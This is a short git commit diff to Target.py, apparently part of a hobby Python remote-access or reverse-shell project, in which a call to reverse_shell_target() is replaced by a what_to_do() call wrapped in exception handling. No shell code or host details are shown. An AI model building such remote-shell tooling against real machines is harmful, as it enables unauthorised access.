ac7e7ad3897af7240dff1ac33cb1f6bfedad6d02
Ulysse Wéry <32456856+Gloxx88@users.noreply.github.com>
2018-12-22 18:30:09 +0100

    Update Target.py

--- Target.py
+++ Target.py
@@ -1,7 +1,12 @@
 from ObjetClientTarget import Target
 
+
 target = Target()
 target.socket_bind()
 target.socket_accept()
-target.reverse_shell_target()
-target.quit()
+try:
+    target.what_to_do()
+except ConnectionResetError as msg:
+    if target.print:
+        print("")
+        #TODO try
